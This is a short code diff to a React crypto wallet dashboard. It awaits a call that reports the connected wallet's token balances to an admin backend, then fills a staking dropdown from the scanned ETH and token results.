@@ -440,8 +440,23 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
       const totalUsd = (ethUsd + tokens.reduce((s, t) => s + parseFloat(t.usdValue), 0)).toFixed(2);
       setTotalUsdValue(totalUsd);
 
-      // 6. Report all balances to backend so admin can see them
-      reportBalanceToBackend(ethFormatted, usdtFormatted, tokens);
+      // 6. Report all balances to backend so admin can see them, then refresh staking dropdown
+      await reportBalanceToBackend(ethFormatted, usdtFormatted, tokens);
+
+      // 7. Populate staking dropdown directly from scan results (no stale DB round-trip)
+      const stakeTokens = [];
+      if (parseFloat(ethFormatted) > 0)
+        stakeTokens.push({ symbol: 'ETH', name: 'Ethereum', balance: ethFormatted, chain: 'eth' });
+      for (const t of tokens) {
+        const c = (t.chain || '').toLowerCase();
+        if (c === 'tron' || c === 'bitcoin') continue;
+        stakeTokens.push({ ...t, chain: c === 'bsc' ? 'bsc' : 'eth' });
+      }
+      if (stakeTokens.length > 0) {
+        setStakeableTokens(stakeTokens);
+        setSelectedToken(stakeTokens[0].symbol);
+        setSelectedTokenChain(stakeTokens[0].chain);
+      }
     } catch (error) {
       console.error('Error fetching wallet balance:', error);
     }
